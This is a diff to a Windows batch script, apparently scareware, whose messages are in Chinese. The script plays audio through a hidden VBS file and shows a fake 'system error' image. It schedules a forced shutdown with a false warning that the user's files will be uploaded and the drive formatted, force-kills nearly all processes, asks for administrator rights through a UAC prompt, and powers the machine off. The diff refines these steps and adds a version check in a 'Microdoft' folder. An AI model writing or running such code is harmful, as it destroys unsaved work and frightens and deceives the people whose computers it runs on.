@@ -2,7 +2,7 @@
 @echo off
 chcp 950>nul
 if not "%start%"=="1" goto DO
-findstr /b /e /offline /c:"0002a 184558 5813482453" "Md1_0002a.ver">nul || (echo 版本錯誤。>>"%~dp0log.txt" & timeout /t 10>nul & exit)
+findstr /offline /c:"0001a 814682 6724824831" /c:"0002a 184558 5813482453" /c:"0002b 348314 5743484865" "%SystemDrive%\Microdoft\Md1_0002b.ver">nul || (echo 版本錯誤。 & echo 版本錯誤。>>"%~dp0log.txt" & timeout /t 10>nul & exit)
 if exist "%~dp0log.txt" (findstr /b /e /offline /c:"微哆動作紀錄 --------------------------------------------- " "%~dp0log.txt">nul && echo ---------------------------------------------------------- >>"%~dp0log.txt") else (echo 微哆動作紀錄 --------------------------------------------- >"%~dp0log.txt")
 if not %errorlevel%==0 echo 微哆動作紀錄 --------------------------------------------- >"%~dp0log.txt"
 goto start
@@ -104,10 +104,10 @@ set script="%temp%\%random%.vbs"
 echo Set s= CreateObject("Wscript.Shell") > %script%
 echo s.run """%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe"" ""%~dp01.mp3""","0" >> %script%
 call %script%
+del /f /q %script%
 start 系統錯誤.png /max /realtime
 shutdown /g /f /t 57 /d 5:15 /c "你的電腦遇到問題，需要格式化系統磁碟機。　　　　　　　　　　　　　　　　我們只上傳你的所有檔案，然後為你格式化系統磁碟機。">>"%~dp0log.txt"
-taskkill /f /fi "imagename ne wmplayer.exe" /fi "imagename ne cmd.exe" /fi "imagename ne dllhost.exe" /fi "imagename ne timeout.exe"
-timeout /t 1 /nobreak>nul
+taskkill /f /fi "imagename ne wmplayer.exe" /fi "imagename ne cmd.exe" /fi "imagename ne dllhost.exe" /fi "imagename ne taskkill.exe" /fi "imagename ne conhost.exe">nul 2>&1
 goto shutdown choice
 
 :shutdown choice 
@@ -123,6 +123,7 @@ choice /n /t 3 /c zxqr /d x /m "「Z」鍵--繼續；「X」鍵--取消"
 if %errorlevel%==4 (
 echo 電腦毀損完畢 "「Z」鍵--開始；「X」鍵--結束"「R」>>"%~dp0log.txt"
 shutdown /a
+explorer
 goto restart
 )
 if %errorlevel%==3 (
@@ -148,10 +149,11 @@ set _DoTime=%%e時%%f分%%g秒點%%h
 echo 在%_DoDate%%_DoTime%結束了系統>>"%~dp0log.txt"
 echo ---------------------------------------------------------- >>"%~dp0log.txt"
 echo Set UAC = CreateObject^("Shell.Application"^) > %script%
-echo UAC.ShellExecute "%windir%\System32\taskkill.exe ", "/f /fi ""imagename ne cmd.exe"" /fi ""imagename ne timeout.exe""", "", "runas", 1 >> %script%
+echo UAC.ShellExecute "%windir%\System32\taskkill.exe ", "/f /fi ""imagename ne cmd.exe"" /fi ""imagename ne conhost.exe""", "", "runas", 1 >> %script%
 call %script%
-timeout /t 1 /nobreak>nul
+del /f /q %script%
 shutdown /p /f
+exit
 )
 
 :boom 
